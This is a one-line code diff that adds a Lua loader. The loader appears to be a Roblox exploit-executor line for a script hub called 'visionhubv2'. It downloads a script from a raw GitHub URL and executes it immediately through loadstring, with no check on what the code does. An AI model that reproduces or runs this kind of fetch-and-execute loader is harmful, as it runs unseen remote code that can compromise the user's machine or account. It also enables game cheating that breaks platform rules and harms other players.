@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/7hbl/visionhubv2/main/visionhubv2"))()
